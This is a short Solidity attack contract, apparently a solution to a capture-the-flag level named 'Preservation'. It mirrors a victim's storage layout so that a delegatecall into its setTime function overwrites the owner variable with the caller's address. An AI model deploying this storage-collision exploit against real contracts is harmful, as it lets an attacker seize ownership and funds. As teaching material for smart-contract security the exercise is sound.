// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    // The state varibales must mimic the order of the preservation Smart Contract so we update the correct variable.
    address public timeZone1Library;
    address public timeZone2Library;
    address public theOwner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        theOwner = msg.sender;
    }
}
